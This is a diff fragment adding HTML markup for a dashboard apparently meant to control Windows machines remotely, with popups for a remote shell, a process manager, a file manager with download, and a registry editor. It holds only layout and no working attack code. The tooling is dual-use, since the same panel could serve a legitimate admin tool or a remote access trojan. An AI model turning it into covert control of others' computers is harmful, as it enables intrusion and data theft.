+<div id="popup-overlay" class="popup-overlay">
+<div class="popup-window glass-panel">
+<div class="popup-header">
+<div class="popup-title" id="popup-title">Action</div>
+<div class="popup-close" id="popup-close">✕</div>
+</div>
+<div class="popup-content" id="popup-content"></div>
+</div>
+</div>
+
+<div id="tooltip" class="tooltip"></div>
+
+<!-- Terminal Popup -->
+<div id="terminal-overlay" class="terminal-overlay">
+<div class="terminal-window glass-panel">
+<div class="terminal-header">
+<div class="terminal-title">
+<span id="terminal-title-text">Remote Shell</span>
+</div>
+<div class="terminal-controls">
+<div class="terminal-btn minimize" id="terminal-minimize">─</div>
+<div class="terminal-btn close" id="terminal-close">✕</div>
+</div>
+</div>
+<div class="terminal-body" id="terminal-container"></div>
+<div class="terminal-status">
+<span id="terminal-status-text">Disconnected</span>
+</div>
+</div>
+</div>
+
+<!-- Process Manager Popup -->
+<div id="procmgr-overlay" class="procmgr-overlay">
+<div class="procmgr-window glass-panel">
+<div class="procmgr-header">
+<div class="procmgr-title">
+<span id="procmgr-title-text">Process Manager</span>
+</div>
+<div class="procmgr-controls">
+<div class="procmgr-btn close" id="procmgr-close">✕</div>
+</div>
+</div>
+<div class="procmgr-toolbar">
+<div class="pm-search-container">
+<input type="text" class="pm-search" id="pm-search" placeholder="Search processes...">
+</div>
+<div class="pm-refresh-btn" id="pm-refresh" title="Refresh">↻</div>
+</div>
+<div class="procmgr-body">
+<div class="pm-table-container">
+<table class="pm-table">
+<thead>
+<tr>
+<th class="pm-col-name" data-sort="name">Name</th>
+<th class="pm-col-pid" data-sort="pid">PID</th>
+<th class="pm-col-memory" data-sort="memory">Memory</th>
+</tr>
+</thead>
+<tbody id="pm-process-list">
+<tr><td colspan="3" class="pm-loading">Loading...</td></tr>
+</tbody>
+</table>
+</div>
+</div>
+<div class="procmgr-status">
+<span id="pm-status-text">Ready</span>
+</div>
+</div>
+</div>
+
+<!-- File Manager Popup -->
+<div id="filemanager-overlay" class="filemanager-overlay">
+<div class="filemanager-window glass-panel">
+<div class="filemanager-header">
+<div class="filemanager-title">
+<span id="filemanager-title-text">File Manager</span>
+</div>
+<div class="filemanager-controls">
+<div class="filemanager-btn close" id="filemanager-close">✕</div>
+</div>
+</div>
+<div class="filemanager-toolbar">
+<button class="fm-btn" id="fm-back" title="Back">←</button>
+<button class="fm-btn" id="fm-forward" title="Forward">→</button>
+<button class="fm-btn" id="fm-up" title="Up">↑</button>
+<button class="fm-btn" id="fm-refresh" title="Refresh">↻</button>
+<button class="fm-btn" id="fm-home" title="Home">⌂</button>
+<div class="fm-path-container">
+<input type="text" class="fm-path" id="fm-path" placeholder="Path...">
+<button class="fm-btn" id="fm-go">Go</button>
+</div>
+</div>
+<div class="filemanager-body">
+<div class="fm-sidebar" id="fm-sidebar">
+<div class="fm-section-title">Drives</div>
+<div class="fm-drives" id="fm-drives"></div>
+<div class="fm-section-title">Quick Access</div>
+<div class="fm-quick-access">
+<div class="fm-quick-item" data-path="%USERPROFILE%\Desktop">Desktop</div>
+<div class="fm-quick-item" data-path="%USERPROFILE%\Documents">Documents</div>
+<div class="fm-quick-item" data-path="%USERPROFILE%\Downloads">Downloads</div>
+</div>
+</div>
+<div class="fm-main">
+<div class="fm-file-list" id="fm-file-list">
+<div class="fm-loading">Loading...</div>
+</div>
+</div>
+</div>
+<div class="filemanager-status">
+<span id="fm-status-text">Ready</span>
+<span id="fm-item-count"></span>
+</div>
+</div>
+</div>
+
+<!-- File Manager Context Menu -->
+<div id="fm-ctx" class="ctx fm-ctx">
+<div class="ctx-item" data-action="fm-open">Open</div>
+<div class="ctx-item" data-action="fm-download">Download</div>
+<div class="submenu-divider"></div>
+<div class="ctx-item" data-action="fm-cut">Cut</div>
+<div class="ctx-item" data-action="fm-copy">Copy</div>
+<div class="ctx-item" data-action="fm-paste">Paste</div>
+<div class="submenu-divider"></div>
+<div class="ctx-item" data-action="fm-rename">Rename</div>
+<div class="ctx-item" data-action="fm-delete">Delete</div>
+<div class="submenu-divider"></div>
+<div class="ctx-item" data-action="fm-newfolder">New Folder</div>
+<div class="ctx-item" data-action="fm-properties">Properties</div>
+</div>
+
+<!-- Registry Manager Overlay -->
+<div id="registry-overlay" class="registry-overlay">
+<div class="registry-window glass-panel">
+<div class="registry-header">
+<div class="registry-title">
+<span id="registry-title-text">Registry Editor</span>
+</div>
+<div class="registry-controls">
+<div class="registry-btn close" id="registry-close">✕</div>
+</div>
+</div>
+<div class="registry-toolbar">
+<button class="reg-btn" id="reg-back" title="Back">←</button>
+<button class="reg-btn" id="reg-up" title="Up">↑</button>
+<button class="reg-btn" id="reg-refresh" title="Refresh">↻</button>
+<div class="reg-path-container">
+<input type="text" class="reg-path" id="reg-path" placeholder="HKEY_LOCAL_MACHINE\SOFTWARE\..." value="HKEY_LOCAL_MACHINE">
+<button class="reg-btn" id="reg-go">Go</button>
+</div>
+</div>
+<div class="registry-body">
+<div class="reg-sidebar" id="reg-sidebar">
+<div class="reg-tree" id="reg-tree">
+<div class="reg-tree-item" data-path="HKEY_CLASSES_ROOT">HKEY_CLASSES_ROOT</div>
+<div class="reg-tree-item" data-path="HKEY_CURRENT_USER">HKEY_CURRENT_USER</div>
+<div class="reg-tree-item active" data-path="HKEY_LOCAL_MACHINE">HKEY_LOCAL_MACHINE</div>
+<div class="reg-tree-item" data-path="HKEY_USERS">HKEY_USERS</div>
+<div class="reg-tree-item" data-path="HKEY_CURRENT_CONFIG">HKEY_CURRENT_CONFIG</div>
+</div>
+</div>
+<div class="reg-main">
+<div class="reg-keys-panel" id="reg-keys-panel">
+<div class="reg-panel-header">Keys</div>
+<div class="reg-keys-list" id="reg-keys-list">
+<div class="reg-loading">Loading...</div>
+</div>
+</div>
+<div class="reg-values-panel" id="reg-values-panel">
+<div class="reg-panel-header">Values</div>
+<div class="reg-values-list" id="reg-values-list">
+<div class="reg-loading">Select a key</div>
+</div>
+</div>
+</div>
+</div>
+<div class="registry-status">
+<span id="reg-status-text">Ready</span>
+</div>
+</div>
+</div>
+
+<!-- Registry Context Menu -->
+<div id="reg-ctx" class="ctx reg-ctx">
+<div class="ctx-item" data-action="reg-new-key">New Key</div>
+<div class="ctx-item" data-action="reg-new-value">New Value</div>
+<div class="submenu-divider"></div>
+<div class="ctx-item" data-action="reg-edit">Modify</div>
+<div class="ctx-item" data-action="reg-rename">Rename</div>
+<div class="ctx-item" data-action="reg-delete">Delete</div>
+<div class="submenu-divider"></div>
+<div class="ctx-item" data-action="reg-copy-path">Copy Path</div>
+</div>
+
+<script src="app.js"></script>
+</body>
+</html>
